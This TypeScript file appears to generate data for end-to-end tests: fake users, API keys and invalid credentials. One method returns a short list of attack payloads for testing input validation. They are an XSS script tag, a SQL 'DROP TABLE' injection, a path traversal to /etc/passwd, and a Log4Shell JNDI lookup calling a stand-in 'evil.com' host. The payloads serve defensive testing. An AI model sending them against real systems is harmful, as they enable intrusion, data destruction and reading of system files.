/**
 * Test Data Generator
 * Generates test data for E2E tests without external dependencies
 */

export interface UserTestData {
  email: string;
  password: string;
  firstName: string;
  lastName: string;
}

export interface ApiKeyTestData {
  name: string;
  scopes: string[];
}

export class TestDataGenerator {
  private static counter = 0;

  static generateUser(): UserTestData {
    this.counter++;
    return {
      email: `test.user${this.counter}@example.com`,
      password: 'TestPassword123!',
      firstName: `Test${this.counter}`,
      lastName: 'User'
    };
  }

  static generateValidUser(): UserTestData {
    return this.generateUser();
  }

  static generateApiKey(): ApiKeyTestData {
    this.counter++;
    return {
      name: `Test API Key ${this.counter}`,
      scopes: ['read:profile', 'write:profile']
    };
  }

  static generateInvalidCredentials(): { email: string; password: string } {
    return {
      email: 'invalid@example.com',
      password: 'wrongpassword'
    };
  }

  static generateMaliciousPayloads(): Array<{ email: string; password: string }> {
    return [
      { email: '<script>alert("xss")</script>', password: 'test' },
      { email: 'test@test.com', password: "'; DROP TABLE users; --" },
      { email: '../../../etc/passwd', password: 'test' },
      { email: 'test@test.com', password: '${jndi:ldap://evil.com/a}' }
    ];
  }

  static generateRandomString(length: number = 10): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }
}
